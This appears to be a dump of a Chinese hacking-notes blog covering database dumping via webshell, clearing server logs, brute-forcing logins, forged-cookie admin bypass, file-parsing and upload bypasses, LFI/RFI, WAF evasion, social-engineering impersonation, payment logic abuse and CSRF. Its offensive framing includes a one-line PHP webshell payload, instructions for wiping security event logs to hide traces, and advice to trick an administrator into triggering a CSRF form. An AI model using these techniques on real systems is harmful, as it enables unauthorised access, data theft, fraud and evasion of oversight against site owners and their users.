<p>mysql数据库脱库，找到root帐号密码，用PHP大马自己带链接功能连接一下，也自己自己上传PHP脱裤脚本，之后找到目标数据库（数据库名），再找到会员表</p>
<p>menber进行脱裤即可。</p>
<h2 id="服务器安全"><a href="#服务器安全" class="headerlink" title="服务器安全"></a>服务器安全</h2><p>命令提示符已被系统管理员停用？ 解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。</p>
<p>如何判断服务器的类型？ 解决方法：直接ping服务器ip，看回显信息进行判断</p>
<p>TTL=32     9X/ME</p>
<p>TTL=64     linux</p>
<p>TTL=128    2000X/XP</p>
<p>TTL=255    UNIX</p>
<p>为什么有时3389开放却不能连接？ 原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制 解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。</p>
<p>最简单的往服务器上传东西方法是什么？ 本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了</p>
<p>限制“命令提示符”的运行权限？ 我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为</p>
<p>了让文件的属性菜单中显示“安全”标签，然后进入“c:\windows\system32\”，找到“cmd.exe”，点右键选择“属性”，切换到“安全”标签，将其中“组</p>
<p>或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警告框。</p>
<p>如何更改windows2003最大连接数？ windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆后断开，</p>
<p>当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运行：services.msc，启用license</p>
<p>logging，别忘了添加完毕后再关闭 License Logging 打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数</p>
<p>如何清除服务器里的IP记录日志？ 1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件 2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝 3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝</p>
<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>网上收集！！</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[burpsuit爆破后台]]></title>
      <url>/2017/04/23/burpsuit%E7%88%86%E7%A0%B4%E5%90%8E%E5%8F%B0/</url>
      <content type="html"><![CDATA[<p>此次测试条件：<br>1.没有token验证<br>2.不点击错误提示则不刷新验证码<br><a id="more"></a><br><img src="http://i.imgur.com/Rt473Oa.png" alt=""></p>
<hr>
<p>所以较简单，使用burpsuite即可，<br>1.抓包，并发送去Intrude<br><img src="http://i.imgur.com/pZcPKaC.png" alt=""></p>
<p>2.设置Intrude<br><img src="http://i.imgur.com/Fsg5ubp.png" alt=""></p>
<p>其中的attack type 设置如下：</p>
<p>Sniper：对变量依次进行破解（依照变量数进行所有字典的组合）<br>Battering ram：对变量同时进行破解（密码和账号是同一个，直至轮完字典）<br>Pitchfork：每个变量对应一个字典（组合为最小字典的数量）<br>Cluster bomb：每个变量对应一个字典，并交集破解（A字典*B字典）</p>
<hr>
<p>3.设置Intruder的payloads属性：<br><img src="http://i.imgur.com/BXzUW0L.png" alt=""></p>
<hr>
<p>4.按Start attack 开始爆破:<br><img src="http://i.imgur.com/7vwKcko.png" alt=""></p>
<p>选择Length不一样的则为爆破成功点。</p>
<hr>
<p>其中Intruder的options可以设置线程等很多东西。。</p>
<p>因为较简单，所以使用burpsuit。如果需要爆破验证码，可以尝试<strong>PKAV</strong>工具</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[cookie 欺骗进后台]]></title>
      <url>/2017/04/21/Cookie%E6%AC%BA%E9%AA%97%E8%BF%9B%E5%90%8E%E5%8F%B0/</url>
      <content type="html"><![CDATA[<p>听说没有“实战”的博客不是好博客。<br>就下载了个CMS来测试下性能–&gt;phpecms1.3</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>###登陆页面：<br><img src="http://i.imgur.com/kYyuq5t.png" alt=""></p>
<hr>
<p>phpecms1.3/admin/cms_check.php文件有一段代码</p>
<pre><code class="bash">&lt;?php
        <span class="keyword">if</span>(!isset(<span class="variable">$_COOKIE</span>[<span class="string">'admin_name'</span>])){
                alert_href(<span class="string">'非法登录'</span>,<span class="string">'cms_login.php'</span>);
        };
?&gt;
</code></pre>
<p><strong>这代码意思是如果cookie是admin_name 则跳转成功，如果不是则非法登陆。</strong></p>
<hr>
<p>/phpecms1.3/admin/cms_welcome.php文件：</p>
<pre><code class="bash">&lt;?php
include(<span class="string">'../system/inc.php'</span>);
include(<span class="string">'cms_check.php'</span>); 

?&gt;
&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;
&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;
&lt;head&gt;
&lt;?php include(<span class="string">'inc_head.php'</span>) ?&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;?php include(<span class="string">'inc_header.php'</span>) ?&gt;
&lt;div id=<span class="string">"content"</span>&gt;
        &lt;div class=<span class="string">"container"</span>&gt;
                &lt;div class=<span class="string">"line-big"</span>&gt;
                        &lt;?php include(<span class="string">'inc_left.php'</span>) ?&gt;
                        &lt;div class=<span class="string">"xx105"</span>&gt;
                                &lt;div class=<span class="string">"hd-1"</span>&gt;使用声明&lt;/div&gt;
                                &lt;div class=<span class="string">"bd-1"</span>&gt;
                                &lt;p&gt;一、遵守中中华人民共和国相关法律，合法使用。&lt;/p&gt;
                                &lt;p&gt;二、此程序为免费版，无使用时间限制。&lt;/p&gt;
                                &lt;p&gt;三、商业使用建议使用收费版，获取更多功能和技术服务。&lt;/p&gt;
                                &lt;p class=<span class="string">"fb color-red"</span>&gt;免费版和收费版的主要差异&lt;/p&gt;
                                &lt;p&gt;一、支持手机版&lt;/p&gt;
                                &lt;p&gt;二、多套模板后后台切换&lt;/p&gt;
                                &lt;p&gt;三、更多的频道类型和详情类型选择&lt;/p&gt;
                                &lt;p&gt;四、支持伪静态&lt;/p&gt;
                                &lt;p&gt;四、咨询QQ：&lt;a href=<span class="string">"http://wpa.qq.com/msgrd?v=3&amp;uin=5474131&amp;site=qq&amp;menu=yes"</span>&gt;5474131&lt;/a&gt; 电话：13400472755 网址：&lt;a href=<span class="string">"http://www.pcfinal.cn"</span> target=<span class="string">"_blank"</span>&gt;[url=http://www.pcfinal.cn]www.pcfinal.cn[/url]&lt;/a&gt;&lt;/p&gt;
                                &lt;/div&gt;
                        &lt;/div&gt;
                &lt;/div&gt;
        &lt;/div&gt;
&lt;/div&gt;
&lt;?php include(<span class="string">'inc_footer.php'</span>) ?&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>后台文件没有任何判断，直接包含进去</strong></p>
<hr>
<p>###如图增加新cookie及修改：<br><img src="http://i.imgur.com/OytbVIS.png" alt=""></p>
<p>###刷新修改过的URL，成功进入后台<br><img src="http://i.imgur.com/kFr4Ff3.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[解析漏洞总结]]></title>
      <url>/2017/04/21/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>解析漏洞:解析就是把代码用指定语言运行出来,解析漏洞就是在运行的过程中没按照原先设定的计划去把语言运行出来,而是运行了另一种过程。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>IIS文件解析漏洞：<br>  ①：当建立<em>.asa  、</em>.asp 的格式文件夹时，其目录下的任意文件都以asp的文件来解析。<br>   例子：在asp文件夹下新建一个txt文件，但是访问该TXT文件时，如果有代码为函数，将以asp的方式去解析，去利用该文件<br>  ②：当文件为*.asp;1.jpg时，IIS同时会以asp脚本来执行（分号后面内容不被解析。貌似该漏洞只存在于6.0版本）<br>  ③：WebDav扩展漏洞：<br>   此扩展支持：PUT/Move/Copy/Delete等方法</p>
<p>   其中PUT方法可用于服务器上传脚本文件（工具有桂林老兵PUT）<br>   Move：移动文件<br>   Copy:改动文件，例如改动后缀名使文件变为shell。</p>
<hr>
<p><img src="http://i.imgur.com/L63jUg6.png" alt=""><br>Apacher解析漏洞（与IIS有所不同）：<br>①    ：假如有个1.php.rar文件内容为&lt;?php  phpinfo();  ?&gt;<br>那么打开1.php.rar文件时并不是下载，而是现在phpinfo文件。<br>②    ：Apache解析扩展名时从后面解析，直至遇到认识的扩展名为止。</p>
<hr>
<p>PHP CGI解析漏洞（Nginx服务器漏洞）：<br>   例如：当访问URL=www.baidu.com/1.jpg时显示的是一张图片，但是当加上/.php时就以Php形式去解析这张图片了。</p>
<hr>
<p>IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞 在默认fast-cgi开启状况下,黑阔上传一个名字为mst.jpg，内容为：<?php="" fputs(fopen('shell.php','w'),'<?php="" eval($_post[cmd])?="">');?>的文件，然后访问mst.jpg/.php,在这个目录下就会生成一句话木马 shell.php。</8.03畸形解析漏洞></p>
<hr>
<p>在windows环境下：<br>xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点,黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单.若上传成功，空格和点都会被windows自动消除,这样也可以getshell。</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 文件解析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTP参数污染]]></title>
      <url>/2017/04/18/Http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/</url>
      <content type="html"><![CDATA[<p>HTTP参数污染：我也不知道怎么解释。。语言水平不好。这种方法通常用来绕过WAF应用防火墙的检测。</p>
<a id="more"></a>
<p>PHP类型：<br><code>http://127.0.0.1/test.php?id=7 or 1=1 in (SQLi)</code><br>如果会出现“请停止攻击该网站”等提示。</p>
<p>这时我们可以尝试参数污染来绕过该WAF。<br>当我们输入：?id=7&amp;id=（sqli)时</p>
<p>waf网络层会解析id=7， –&gt;  显示合法<br>PHP应用层会解析  id=(sqli) –&gt; 注入成功</p>
<p>利用：把参数利用拼接符写在后面来绕过。</p>
<hr>
<p>asp类型: <code>?id=1&amp;id=s&amp;id=e&amp;id=l&amp;id=e&amp;id=c&amp;id=t</code></p>
<p>如果它接受到两个参数值，它会拼接两个相同参数的值，因此你可以将被过滤的关键词拆分到两个参数中进行攻击从而绕过WAF。</p>
<p>如上面我写参数拼接在一起的就带有selec效果了。</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[旁注攻击]]></title>
      <url>/2017/04/15/%E6%97%81%E6%B3%A8%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<p>旁注攻击：同一台服务器上有多个网站。<br>当A网站攻不下时，发现还有B网站也是同一个服务器时就尝试去攻占B网站。如果得到B网站的服务器权限也就相当于得到A网站的服务器权限。<br><a id="more"></a></p>
<p>过程：<br> IP逆向查询：查询A域名的真实IP，然后反查IP得出IP（服务器）拥有的其它网站。（但这并不代表这是服务器所有的网站，因为这些都是通过收录得到的）<br>注：注意查看是否使用了CDN</p>
<p>得到其它网站后，就渗透其它的网站，直至得到此网站的权限，后提权XXOO。。。</p>
<hr>
<p>SQL跨库查询：垮库查询攻击<br>假设A,B网站的同为一个服务器，且皆使用同一种数据库，A数据库为ADB，B数据库为BDB。<br>如果B数据库在操作时可以对A数据库动刀，那么就称为跨库攻击。</p>
<p>其实和SQL注入差不多，例如，B网站注入成功并爆出数据库，那应该也爆出A网站的数据库（因为同为一个数据库软件），如果B网站的权限可以下载A或者查看A数据库的信息，那么久垮库攻击成功</p>
<hr>
<p>目录越权：<br>假如B网站上传了一个Webshell，在读取B网站的同时，发现可以去A网站的目录读取A网站的信息，则称为目录越权。假设还有写入权限，即可往A网站写入Shell。<br>注：尽管只有读取权限，也可读取数据库信息，或者后台位置，或者利用代码审计进行攻击。</p>
<hr>
<p>C段查询：<a href="https://www.phpinfo.me/bing.php" target="_blank" rel="external">https://www.phpinfo.me/bing.php</a><br>子域名爆破：<a href="https://www.phpinfo.me/domain" target="_blank" rel="external">https://www.phpinfo.me/domain</a></p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件包含漏洞]]></title>
      <url>/2017/04/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>文件包含漏洞：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。（其实不止PHP，ASP、JSP,、ASP.Net都存在文件包含漏洞）<br><a id="more"></a><br>因为程序人员通常把重复使用的函数写到单个文件，在使用时就直接调用此文件，调用文件的过程就是文件包含。也因为PHP语言提供的文件包含太灵活和强大，所以漏洞或许多些。</p>
<hr>
<p>PHP中有四个包含函数：incluede（）、include_once（）、require（）、require_once（）。</p>
<p>Include（）：函数包含文件时，只有代码执行到include()函数时将文件包含进来。发生错误时系统只给出一个警告，继续向下执行。</p>
<p>include_once（）：函数基本和include()相同，不过差别是：重复调用同一文件时，程序只调用一次。建议尽量使用include_once()函数不会因为重复包含文件而发生错误。</p>
<p>Require（）函数与include（）的差别是：<br>1，    如果发生错误，函数会输出错误信息，并立即终止脚本的处理。<br>2，    函数调用文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时，才调用。</p>
<p>require_once（）：此行语句和require（）语句类似，唯一区别就是如果该文件中的代码已经被包含，则不会再次包含。</p>
<hr>
<p>文件包含分类：远程包含（LFI）、本地包含（RFI）。<br>     区别：被包含的文件在服务器本地时，就形成的本地文件包含漏洞，被包涵的文件在第三方服务是，就形成了远程文件包含漏洞。</p>
<p>漏洞成因：在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就 可能导致意外的文件泄露甚至恶意的代码注入。</p>
<hr>
<p>用法：正常URL：www.xxoo.com/action/n=file.php<br>      假如根目录存在文件包含漏洞：<br>www.xxoo.com/action/n=../../../../robots.txt（多../几个可以确保回到根目录）<br>则把robots.txt文件读取出来，<br>假如robots.txt符合PHP代码类型，则按照php代码类型去执行robots文件<br>（其实无论哪个文件后缀，只要符合PHP类型，则按PHP解析文件。不然则以文本格式显示文件内容）</p>
<hr>
<p>远程包含：www.xxoo.com/action/n=<a href="http://www.bbb.com/2/n=robots.txt" target="_blank" rel="external">http://www.bbb.com/2/n=robots.txt</a><br>        则输入 <a href="http://www.bbb.com网站的robots.txt文件" target="_blank" rel="external">http://www.bbb.com网站的robots.txt文件</a><br>  前提：都有包含漏洞。都开启了allow_url_include=on</p>
<hr>
<p>注：<br>1.其实有些版本还支持%00截断，例如www.xxoo.com/action/n=file.php%00.jpg。但是解析是以php解析（绕过后缀必须为指定后缀）。<br>2.str_replace（）：将”http:// ”、”<a href="https://”、" target="_blank" rel="external">https://”、</a> ” ../”、”..\”替换为空字符<br>  绕过：双写绕过替换规则如page=ht<a href="http://tp://192.168.1.1/robots.txt" target="_blank" rel="external">http://tp://192.168.1.1/robots.txt</a> (应用于远程包含)<br>3.当运用个别包含函数时，输入错误文件可爆出绝对路径</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[社会工程学]]></title>
      <url>/2017/04/15/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
      <content type="html"><![CDATA[<p>社会工程学：俗称的社工。通过对人的本性，弱点，好奇心、信任、贪婪等心里陷阱进行欺骗的一种危害手段。<br><a id="more"></a><br>俗话说的“攻城为下，攻心为上”这句话就是披露社会工程学的巨大力量。每一个强大的社工人员必然也是一个优良的“读心术”及沟通专家。</p>
<p>社工工作：</p>
<ol>
<li>信息收集：比如说电话号码，名字，工作的ID号，什么手机号啊，出生日期，身份证号，邮箱，账号，常流浪的网页等等看似无关的信息。<br>方法：Google Hack 、Whois、whois反查、网站的社工裤</li>
<li>沟通<br>方法：“诚心以待”去获取员工的帮助。</li>
<li>伪造某人信息去代替他<br>方法：在充分得到某领导信息后，向底层人员假装获取信息</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> 信息收集 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[暴力破解]]></title>
      <url>/2017/04/15/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      <content type="html"><![CDATA[<p>暴力破解：也可称为弱口令猜解，通常和社工（社会工程学）挂钩，过程需要有强大的字典。特殊情况不用，例如admin、admin123、admin888、adminadmin等若口令可手工猜解。<br><a id="more"></a><br>弱口令字典在线生成网站：<a href="http://pass.cnseay.com/" target="_blank" rel="external">http://pass.cnseay.com/</a><br><img src="http://i.imgur.com/F5zbrG9.png" alt=""></p>
<hr>
<p>利用Burpsuit破解：</p>
<ol>
<li>抓包</li>
<li>发送包到Intruder</li>
<li>选择变量<br>Sniper：对变量一次进行破解（依照变量数进行所有字典的组合）<br>Battering ram：对变量同时进行破解（密码和账号是同一个，直至轮完字典）<br>Pitchfork：每个变量对应一个字典（组合为最小字典的数量）<br>Cluster bomb：每个变量对应一个字典，并交集破解（A字典*B字典）</li>
<li>选择Payload type（这个看字典类型来选）</li>
<li>Payload options  选择字典并导入，或者自己添加</li>
<li>点击Start attack 开始破解。</li>
<li>在弹出的Intruder attack 查看Length 的返回值，不一样长度则表现出返回的内容不同，所以字段不同，所以有可能是破解成功的Payload</li>
</ol>
<p>其它工具还有PKAV等。<br><strong>PKAV：适用于爆破带有图片验证码的。但是本身不抓包，需配合抓包工具导请求包。</strong></p>
<hr>
<p>遇到特殊情况：<br>1.假如存在验证Token值时：<a href="https://my.oschina.net/oby/blog/847522" target="_blank" rel="external">https://my.oschina.net/oby/blog/847522</a><br>2.存在验证码时：<br>   验证码固定：输入正确验证码后抓包，爆破登录账号和密码<br>   验证码不点击确定时不重新获取：输入正确验证码后抓包，爆破登录账号和密码</p>
<p>3.验证码：不为图片（为数据时）<br>  抓取网页源代码读取验证码位置。<br>4.带有登录时效：设置线程爆破<br>5.带有IP登陆次数限制：<br>6.登陆的密码和账号进行过加密：需要知道加密的JS文件<br><a href="http://www.myhack58.com/Article/60/61/2017/83932.htm" target="_blank" rel="external">http://www.myhack58.com/Article/60/61/2017/83932.htm</a></p>
<p>骚套路:抓包删除验证码的验证信息,因为值为空（不错则对的套路），所以验证码正确。</p>
<hr>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[URL跳转与钓鱼]]></title>
      <url>/2017/04/10/URL%E8%B7%B3%E8%BD%AC%E4%B8%8E%E9%92%93%E9%B1%BC/</url>
      <content type="html"><![CDATA[<p>URL跳转：分为客户端跳转和服务端跳转。但是结果都是一样，跳到另外一个页面。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>客户端跳转称为：URL重定向<br>服务端跳转称为：URL转发</p>
<hr>
<p>URL重定向例子：<br>   当前URL为：www.xxoo.com/ppp.php<br>   点击“登陆”按钮后<br>   URL变为 ：www.xxoo.com/login.php</p>
<p>注：重定向状态码为：302</p>
<hr>
<p>URL转发例子：<br>    当前URL为：www.xxoo.com/ppp.php<br>    点击“登陆”按钮后<br>URL还是  ：www.xxoo.com/ppp.php （没变化）</p>
<hr>
<p>不是所有的跳转都和上面有关，而是直接向服务器发送请求，例如：</p>
<p>例如：<code>&lt;a href=”http://www.xxoo.com/new.jsp”&gt;新闻30分&lt;/a&gt;</code><br>点击新闻30分按钮，跳到<a href="http://www.xxoo.com/new.jsp" target="_blank" rel="external">http://www.xxoo.com/new.jsp</a> 页面。</p>
<p>和URL重定向区别：是直接向服务器发送请求，而不用间接的发送302状态码来跳转。（个人理解。。）</p>
<hr>
<p>钓鱼：<br>钓鱼网站：域名和某个页面做的非常相似，而且域名也相差无几。当受害者打开此网页，粗略的看了一下域名，发现页面也做的很像，然后输入账号密码，就被钓鱼了。</p>
<p>利用的相识字符：<br>I(大写i)、l（小写L）和1<br>D、O、0<br>S、5<br>M、N</p>
<hr>
<p>绕过 恶意URL 策略：<br>URL跳转：例如：<a href="http://www.baidu.com/test?=http://ta0bao.com" target="_blank" rel="external">http://www.baidu.com/test?=http://ta0bao.com</a><br>（打开URL时中途会发送一个302重定向数据包）</p>
<p><strong>注：URL转发不可作为URL跳转漏洞，因为URL转发无法进行域名的跳转，所以URL跳转漏洞也称为重定向漏洞。</strong></p>
<p>php，ASP，ASP.Net 都有类似的重定向，</p>
<p>例如PHP的：</p>
<pre><code class="bash">&lt;?php
  <span class="variable">$url</span>=<span class="variable">$_GET</span>(‘url’)
  Header(“Location:<span class="variable">$url</span>”);
?&gt;
</code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[上传篇]]></title>
      <url>/2017/04/10/%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      <content type="html"><![CDATA[<p>上传：管理员用来管理网页，编辑网页的一个功能。也是攻击者用来上传Webshell的一个功能，没什么特殊情况一般存在于后台。当然也是有特殊的，例如注入上传，截包修改内容上传，修改个人头像时上传等。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>其中上传漏洞一般为以下几种：</p>
<ol>
<li>任意文件上传（无类型限制）</li>
<li>IIS文件解析漏洞上传图片等文件（ma.asp;.jpg我也当是图片了。。）</li>
<li>利用文件编辑器的漏洞上传</li>
<li>抓包，构造文件上传漏洞。</li>
<li>如果是本地的JS验证，可关闭JS上传或者中间人攻击。</li>
</ol>
<hr>
<p>绕过上传漏洞：<br>   客户端使用本地javascript对扩展名验证：<br>1.本地构造上传HTML提交突破JS验证<br>2.查看元素，删除onsubmit事件。<br>3.先上传JPG后缀名，然后抓包再修改后缀名。<br>如果本地检查的是MIME:则同理，抓包修改mime类型。<br>注意修改类型的同时，修改Content-Length长度。<br>4.利用空格（windows 会把空格给过滤。）</p>
<hr>
<p>服务端扩展名检测：<br>白盒：<br>1.如果IIS可利用上述的IIS漏洞，<br>2.cgi漏洞，<br>3.%00截断上传，<br>4.MIME验证：抓包修改</p>
<ul>
<li>gif    image/gif</li>
<li>jpg    image/jpeg</li>
<li>php    application/octet-stream</li>
<li>asp  application/x-asap</li>
<li>png    image/png</li>
<li>7z    application/octet-stream</li>
<li>txt    text/plain</li>
<li>rar    application/octet-stream</li>
</ul>
<p>5.运用::$DATA数据流上传，具体我也忘了，上次比赛GET到的。<br>用法：如filename=1.php  修改为:filename=1.php::$DATA</p>
<p>黑盒：<br>1.这类比较容易绕过，尝试一切后缀名，总有漏鱼之网。。例如cer，，asa<br>2.尝试错误后缀名上传，例如“asp. （点）”  “asp (空格)” 上传成功后windows系统自动剔除非法扩展名字符。然后剩下asp</p>
<p>目录验证：抓包时，如果看到路径，可尝试修改路径名，因为如果不存在路径文件名，系统一般会创建，然后利用IIS解析漏洞进行解析。</p>
<p>服务端使用重命名：<br>1.抓包查看返回包<br>2.查看源代码。</p>
<hr>
<p>文本编辑器上传漏洞：<br>FCKeditor（现更名为CKEditor）：<br>   查看版本信息：/FCKediter/editor/dialog/fck_about.html<br>   默认上传路径：</p>
<ol>
<li>FCKeditor/editor/filemanager/browser/default/browser.html </li>
<li>FCKeditor/editor/filemanager/browser/default/connectors/test.html</li>
<li>FCKeditor/editor/filemanager/browser/ upload/test.html</li>
<li>FCKeditor/editor/filemanager/connectors/test.html</li>
<li>FCKeditor/editor/filemanager/ uploadtest.html</li>
</ol>
<p>JSP 版：<br>FCKeditor/editor/filemanager/browser/default/browser.html</p>
<p>FCKeditor&lt;=2.4.3版本采用黑名单限制，但是忽略了以下后缀名：<br>1.cer和asa等。<br>2.而且存在任意文件上传漏洞<br>(因为上传判断时，Media上传类型没定义，那上传时把URL改成<br>————–/Upload.php?type=Media<br>那上传时服务器就缺少文件后缀名验证机制。)</p>
<hr>
<p>其它漏洞：<br>asp.net二次传。<br>建立畸形文件夹。</p>
<p>Fckeditor利用：<br>  高版本过滤 “.“变”_“过滤<br>Logo.asp;.jpg ==&gt; logo_asp;.jpg</p>
<hr>
<p>其它编辑器漏洞:Ewebeditor/Ueditor/KindEditor/Xheditor</p>
<p>Ewededitor:asp     默认密码：admin<br>默认后台：ewebeditor/admin_login.asp<br>默认数据库：ewebeditor/db/ewebeditor.mdb</p>
]]></content>
      
        
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 上传文件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[逻辑错误漏洞]]></title>
      <url>/2017/04/10/%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>逻辑漏洞：由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误.(程序不能处理一些逻辑上的漏洞，但并不代表程序会出错。)<br><a id="more"></a><br>例如：这件在本地验证时值10元，传到服务端也是10元，那么问题来了，假如一件10元的物品被修改成1元传到服务器，服务端没有验证，是不是也是用1元来解析物品价格呢，逻辑漏洞就是这种。</p>
<p>出现地方：业务流程上。所以一般工具都无法识别。<br>   例如：修改密码，找回密码，修改个人资料，物品购买时资金提交等。</p>
<p>绕过授权验证：<br>   水平越权：相同级别用户之间的信息访问或修改<br>   垂直越权：不同级别直接的用户的信息访问或修改（例如：用户和管理员）</p>
<p>  例子：<br>当访问我的个人信息时（假设我的账号为123456），<br>URL为：www.qwerdf.com/user/Information?id=123456.php<br>但当我把<br>URL改为：www.qwerdf.com/user/Information?id=456.php<br>也访问了账号456的人的信息，<br>就称为水平越权。</p>
<p>当我把user改成admin,（假设某一位管理员ID=1）<br>URL为：www.qwerdf.com/admin/Information?id=1.php时<br>我也访问了管理员信息<br>就称为垂直越权</p>
<p>当然，除了查看信息，删除，修改，增加等非正常操作都是越权。</p>
<hr>
<p>密码找回逻辑漏洞：<br>假设：www.xxoo.com/mima/back.asp 为一个密码找回页面<br><img src="http://i.imgur.com/oJ1XwAo.png" alt=""><br>当我填写找回密码的账号时，跳到身份验证这一步，获取验证码，填写正确后，就会跳到设置新密码那一步，然后完成。</p>
<p>但是如果身份验证那一步没设置好，就会出现密码找回的逻辑漏洞。</p>
<p>假设我在身份验证的时候抓包，发现包里有个验证手机号码为：186<strong><em>**</em></strong>。<br>然后我把包里的号码修改为其它手机号，发现其它手机号接收到了验证码，<br>我就可以凭借这验证码修改密码了。</p>
<p>这就是逻辑漏洞。</p>
<p>利用过程：<br>1.输入其它账号，<br>2.到身份验证时修改原本的验证号码的信息。<br>3.得到返回的验证码后<br>4.加以利用就可以做出修改了。</p>
<hr>
<p>支付逻辑漏洞：<br>原理同上。。<br>都是在发送服务器端支付信息时修改里面的内容即可。</p>
<p>利用地方：<br>1.商品数量<br>2.商品价格<br>3.商品折扣<br>4.商品运费<br>5.商品信息的中转、跳转、到支付接口时的参数。 </p>
<p>（当类型判断不正确时，例如加入数量应该为整型，但是强行修改为字符型或其它不相关的类型时，有可能会导致系统崩毁或报错）</p>
<hr>
<p>账户的恶意攻击：<br>   假入A账户要冻结B账户的银行卡。操作如下：</p>
<ol>
<li>A账户输入B账户的银行卡信息，然后故意输错密码</li>
<li>当系统的安全机制（防爆破）提示还可输错4次时</li>
<li>A再进行输错的操作</li>
<li>B账户冻结</li>
<li>账户的恶意攻击成功实施。</li>
</ol>
<p><img src="http://i.imgur.com/sLlMFno.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CSRF]]></title>
      <url>/2017/04/10/CSRF/</url>
      <content type="html"><![CDATA[<p>CSRF（跨站请求伪造）：也被称为XSRF，感觉和CSS被称为XSS差不多。<br>CSRF与XSS区别：XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站（个人理解：是否需要直接获取用户权限。）</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><p>CSRF成功要领：<br>1.CMS开源（因为要知道网站页面的一点信息才能构造CSRF代码。）<br>2．无需验证码验证<br>3．无referer和token<br>   （token其实可以获取，referer用来防外链）<br>4．管理员正在后台或者网站储存着有效Cookie<br>5．…..</p>
<hr>
<p>###1.查看该CMS源码，如我知道该源码为DWVA CMS，下载分析，发现修改管理员的地方没有Token验证，于是查看并构造代码：<br><img src="http://i.imgur.com/Nr1Ij0b.png" alt=""></p>
<p>###2.表单写入文本<br><img src="http://i.imgur.com/WshHC9e.png" alt=""></p>
<p>###3.修改action的值（#提交数据到本页，但如果是网站，应修改为网站的路径）<br> 添加value（要操作的数值）。<br>最终修改如下：<br><img src="http://i.imgur.com/FVCT7R2.png" alt=""><br>保存为html格式。</p>
<p>###4.打开并按按钮，成功<br><img src="http://i.imgur.com/6PuQrij.png" alt=""><br>发现成功修改，。然后我们可以把这玩意用邮件发送给目标站点的管理员并用社会工程学让他打开了。。顺便叫他按一下按钮。。</p>
<hr>
